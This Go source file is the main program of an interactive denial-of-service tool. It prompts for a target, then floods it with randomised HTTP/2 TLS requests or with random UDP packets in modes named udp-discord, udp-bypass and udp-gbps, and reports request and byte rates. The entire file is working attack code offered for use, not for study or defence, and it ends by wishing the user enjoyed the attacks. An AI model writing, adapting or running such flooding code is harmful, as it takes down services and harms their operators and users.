package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"github.com/vexsx/KrakenNet/config"
	"github.com/vexsx/KrakenNet/pkg"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
)

var userAgents []string
var referers []string
var methodsHTTP = []string{"GET", "POST", "HEAD"}

func loadListFromFile(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		return nil
	}
	defer file.Close()
	var list []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			list = append(list, line)
		}
	}
	return list
}

func randomFromList(list []string, fallback string) string {
	if len(list) == 0 {
		return fallback
	}
	return list[rand.Intn(len(list))]
}

func randomUserAgent() string {
	return randomFromList(userAgents, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
}

func randomReferer() string {
	return randomFromList(referers, "https://google.com/")
}

func randomMethod() string {
	return methodsHTTP[rand.Intn(len(methodsHTTP))]
}

func randomPath() string {
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, rand.Intn(10)+5)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return "/" + string(b)
}

func newHTTPClientTLS(connections int) *http.Client {
	tr := &http.Transport{
		MaxIdleConns:        connections * 2,
		MaxIdleConnsPerHost: connections * 2,
		IdleConnTimeout:     10 * time.Second,
		DisableCompression:  true,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
	}
	http2.ConfigureTransport(tr)
	return &http.Client{
		Transport: tr,
		Timeout:   6 * time.Second,
	}
}

func sendTLSRequest(client *http.Client, baseURL string) bool {
	req, err := http.NewRequest(randomMethod(), baseURL+randomPath(), nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Referer", randomReferer())
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	return resp.StatusCode >= 200 && resp.StatusCode < 500
}

func generatePayload(size int) []byte {
	payload := make([]byte, size)
	for i := range payload {
		payload[i] = byte(rand.Intn(256))
	}
	return payload
}

func sendUDP(conn net.Conn, payload []byte) bool {
	_, err := conn.Write(payload)
	return err == nil
}

// formatBytes convertit le débit en lecture humaine intelligente
func formatBytes(bytes float64) string {
	units := []string{"Bps", "KBps", "MBps", "GBps"}
	i := 0
	for bytes >= 1024 && i < len(units)-1 {
		bytes /= 1024
		i++
	}
	return fmt.Sprintf("%.2f %s", bytes, units[i])
}

func runAttack() {
	rand.Seed(time.Now().UnixNano())
	reader := bufio.NewReader(os.Stdin)
	userAgents = loadListFromFile("useragents.txt")
	referers = loadListFromFile("referers.txt")

	fmt.Print(color.Yellow + "🌐 Target (URL or IP): " + color.Reset)
	target, _ := reader.ReadString('\n')
	target = strings.TrimSpace(target)

	fmt.Print(color.Yellow + "🛠 Select method :\nkraken\ntls\nudp-discord\nudp-bypass\nudp-gbps\n" + color.Reset)
	mode, _ := reader.ReadString('\n')
	mode = strings.TrimSpace(strings.ToLower(mode))

	var connections int
	if mode != "" {
		fmt.Print(color.Yellow + "🔗 Connections per worker: " + color.Reset)
		cStr, _ := reader.ReadString('\n')
		connections, _ = strconv.Atoi(strings.TrimSpace(cStr))
		if connections < 1 {
			connections = 10
		}
	}

	fmt.Print(color.Yellow + "🔧 Number of workers: " + color.Reset)
	wStr, _ := reader.ReadString('\n')
	workers, _ := strconv.Atoi(strings.TrimSpace(wStr))
	if workers < 1 {
		workers = 10
	}

	fmt.Print(color.Yellow + "⏱️ Duration (in seconds): " + color.Reset)
	dStr, _ := reader.ReadString('\n')
	durationSec, _ := strconv.Atoi(strings.TrimSpace(dStr))
	if durationSec < 1 {
		durationSec = 30
	}
	attackDuration := time.Duration(durationSec) * time.Second

	var udpPort int
	if mode == "udp-discord" || mode == "udp-bypass" || mode == "udp-gbps" {
		fmt.Print(color.Yellow + "🎯 UDP Port (target): " + color.Reset)
		portStr, _ := reader.ReadString('\n')
		udpPort, _ = strconv.Atoi(strings.TrimSpace(portStr))
		if udpPort < 1 {
			udpPort = 5000
		}
	}

	fmt.Println(color.Green + "🚀 Attack starting..." + color.Reset)

	var totalSuccess int64
	var totalFail int64
	var totalBytes int64
	var wg sync.WaitGroup
	ctx, cancel := context.WithTimeout(context.Background(), attackDuration)
	defer cancel()

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			switch mode {
			case "tls", "kraken":
				client := newHTTPClientTLS(connections)
				for {
					select {
					case <-ctx.Done():
						return
					default:
						for j := 0; j < connections; j++ {
							if sendTLSRequest(client, target) {
								atomic.AddInt64(&totalSuccess, 1)
							} else {
								atomic.AddInt64(&totalFail, 1)
							}
						}
					}
				}

			case "udp-discord", "udp-bypass", "udp-gbps":
				conns := make([]net.Conn, connections)
				for i := 0; i < connections; i++ {
					c, err := net.Dial("udp", fmt.Sprintf("%s:%d", target, udpPort))
					if err != nil {
						continue
					}
					conns[i] = c
				}
				defer func() {
					for _, c := range conns {
						if c != nil {
							c.Close()
						}
					}
				}()

				payloadSize := 1024
				if mode == "udp-gbps" {
					payloadSize = 8192
				}

				for {
					select {
					case <-ctx.Done():
						return
					default:
						for _, c := range conns {
							if c != nil {
								payload := generatePayload(payloadSize)
								if sendUDP(c, payload) {
									atomic.AddInt64(&totalSuccess, 1)
									atomic.AddInt64(&totalBytes, int64(len(payload)))
								} else {
									atomic.AddInt64(&totalFail, 1)
								}
							}
						}
					}
				}
			}
		}()
	}

	wg.Wait()

	if mode == "tls" || mode == "kraken" {
		total := atomic.LoadInt64(&totalSuccess) + atomic.LoadInt64(&totalFail)
		rps := float64(total) / float64(durationSec)
		fmt.Println(color.Magenta + "🧨 Attack complete. Results:" + color.Reset)
		fmt.Printf("%s✅ Success requests : %d%s\n", color.Green, totalSuccess, color.Reset)
		fmt.Printf("%s❌ Failed requests  : %d%s\n", color.Red, totalFail, color.Reset)
		fmt.Printf("%s⏱️ Duration         : %d seconds%s\n", color.Cyan, durationSec, color.Reset)
		fmt.Printf("%s📈 Average RPS      : %.2f req/sec%s\n", color.Yellow, rps, color.Reset)
	} else {
		bytes := atomic.LoadInt64(&totalBytes)
		bps := float64(bytes) / float64(durationSec)
		fmt.Println(color.Magenta + "🧨 Attack complete. Results:" + color.Reset)
		fmt.Printf("%s✅ Success packets : %d%s\n", color.Green, totalSuccess, color.Reset)
		fmt.Printf("%s❌ Failed packets  : %d%s\n", color.Red, totalFail, color.Reset)
		fmt.Printf("%s⏱️ Duration        : %d seconds%s\n", color.Cyan, durationSec, color.Reset)
		fmt.Printf("%s📈 Average BPS     : %s%s\n", color.Yellow, formatBytes(bps), color.Reset)
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())
	pkg.PrintBanner()
	reader := bufio.NewReader(os.Stdin)

	for {
		runAttack()

		fmt.Print(color.Yellow + "\n🔄 Do you want to start another attack? (y/n): " + color.Reset)
		again, _ := reader.ReadString('\n')
		again = strings.TrimSpace(strings.ToLower(again))

		if again != "y" {
			fmt.Println(color.Green + "👋 Bye! Hope you liked your attacks" + color.Reset)
			break
		}
	}
}
